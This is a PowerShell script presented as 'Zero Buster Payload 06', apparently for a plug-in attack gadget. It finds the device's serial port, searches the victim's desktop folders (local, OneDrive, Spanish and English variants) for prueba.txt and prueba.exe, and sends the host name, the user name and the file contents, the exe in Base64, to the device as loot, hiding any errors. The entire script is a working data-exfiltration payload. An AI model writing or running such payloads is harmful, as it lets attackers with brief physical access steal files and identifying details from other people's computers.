<#
.SYNOPSIS
    Zero Buster - Payload 06: Windows Archivos (Desktop: prueba.txt y prueba.exe)
.DESCRIPTION
    Busca prueba.txt y prueba.exe en todas las posibles rutas de Escritorio
    (incluyendo escritorios sincronizados con OneDrive y variantes de idioma).
    Exfiltra prueba.txt en texto plano y prueba.exe en Base64 a la MicroSD.
.AUTHOR
    @DonJulve
#>

Add-Type -AssemblyName System.IO.Ports

$targetPort = $null
for ($i = 0; $i -lt 60; $i++) {
    $availablePorts = [System.IO.Ports.SerialPort]::GetPortNames()
    if ($availablePorts.Count -gt 0) {
        $targetPort = ($availablePorts | Sort-Object { [int]($_ -replace '\D') } | Select-Object -Last 1)
        if ($availablePorts.Count -gt 1 -or $targetPort -ne "COM1") {
            break
        }
    }
    Start-Sleep -Milliseconds 250
}

if (-not $targetPort -and $availablePorts.Count -gt 0) {
    $targetPort = $availablePorts[-1]
}

if (-not $targetPort) { exit 1 }

Start-Sleep -Milliseconds 500

$serial = New-Object System.IO.Ports.SerialPort $targetPort, 115200, None, 8, One
$serial.ReadTimeout = 2000
$serial.WriteTimeout = 5000
$serial.DtrEnable = $true
$serial.RtsEnable = $true

try {
    $serial.Open()

    # Recolectar todas las posibles rutas del Escritorio (OneDrive, Local, Español/Inglés)
    $candidateDirs = @(
        [Environment]::GetFolderPath('Desktop'),
        [Environment]::GetFolderPath('DesktopDirectory'),
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\OneDrive\Desktop",
        "$env:USERPROFILE\Escritorio",
        "$env:USERPROFILE\OneDrive\Escritorio"
    ) | Where-Object { $_ -and (Test-Path $_) } | Select-Object -Unique

    # Buscar prueba.txt
    $txtFound = $null
    foreach ($d in $candidateDirs) {
        $candidate = Join-Path $d "prueba.txt"
        if ((Test-Path $candidate) -and -not (Test-Path $candidate -PathType Container)) {
            $txtFound = $candidate
            break
        }
    }

    # Buscar prueba.exe
    $exeFound = $null
    foreach ($d in $candidateDirs) {
        $candidate = Join-Path $d "prueba.exe"
        if ((Test-Path $candidate) -and -not (Test-Path $candidate -PathType Container)) {
            $exeFound = $candidate
            break
        }
    }

    $serial.WriteLine("========================================")
    $serial.WriteLine("  ZERO BUSTER - FILE DUMP (WINDOWS)     ")
    $serial.WriteLine("========================================")
    $serial.WriteLine("[*] Host    : " + $env:COMPUTERNAME)
    $serial.WriteLine("[*] User    : " + $env:USERNAME)
    $serial.WriteLine("[*] Date    : " + (Get-Date -Format "yyyy-MM-dd HH:mm:ss"))
    $serial.WriteLine("----------------------------------------")

    # Volcado de prueba.txt
    if ($txtFound) {
        $txtSize = (Get-Item $txtFound).Length
        $serial.WriteLine("[+] File: $txtFound ($txtSize bytes)")
        $serial.WriteLine("--- BEGIN prueba.txt ---")
        Get-Content $txtFound -Raw -ErrorAction SilentlyContinue -split "`n" | ForEach-Object {
            $serial.WriteLine($_.TrimEnd("`r"))
        }
        $serial.WriteLine("--- END prueba.txt ---")
    } else {
        $serial.WriteLine("[!] prueba.txt NOT FOUND (Checked: " + ($candidateDirs -join "; ") + ")")
    }

    $serial.WriteLine("----------------------------------------")

    # Volcado de prueba.exe en Base64
    if ($exeFound) {
        $exeSize = (Get-Item $exeFound).Length
        $serial.WriteLine("[+] File: $exeFound ($exeSize bytes)")
        $serial.WriteLine("[+] To decode: [IO.File]::WriteAllBytes('prueba.exe',[Convert]::FromBase64String((gc loot.txt)))")
        $serial.WriteLine("--- BEGIN prueba.exe (BASE64) ---")
        $bytes = [IO.File]::ReadAllBytes($exeFound)
        $b64 = [Convert]::ToBase64String($bytes, [Base64FormattingOptions]::InsertLineBreaks)
        $b64 -split "`n" | ForEach-Object {
            $serial.WriteLine($_.TrimEnd("`r"))
        }
        $serial.WriteLine("--- END prueba.exe (BASE64) ---")
    } else {
        $serial.WriteLine("[!] prueba.exe NOT FOUND (Checked: " + ($candidateDirs -join "; ") + ")")
    }

    $serial.WriteLine("========================================")
    $serial.WriteLine("[+] File dump completed.")
} catch {
    # Silencioso
} finally {
    try {
        $serial.WriteLine("<<<EOF>>>")
        Start-Sleep -Milliseconds 200
        $serial.Close()
    } catch {}
}

exit

